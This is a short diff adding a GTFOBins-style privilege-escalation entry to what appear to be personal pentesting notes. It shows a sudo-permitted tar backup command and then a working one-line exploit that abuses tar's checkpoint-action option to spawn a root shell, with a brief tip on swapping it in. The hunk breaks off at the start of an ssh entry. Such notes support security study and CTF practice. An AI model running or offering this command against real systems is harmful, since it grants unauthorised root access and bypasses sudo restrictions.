@@ -5,6 +5,18 @@ https://gtfobins.org/
 
 ---
 
+/usr/bin/tar 
+
+/usr/bin/tar -czvf /tmp/backup.tar.gz *
+
+```
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz /dev/null \\  --checkpoint=1 \\  --checkpoint-action=exec=/bin/sh
+```
+
+replace "-czvf /tmp/backup.tar.gz *" with the cf devnull
+
+---
+
 /usr/bin/ssh
 
 ```
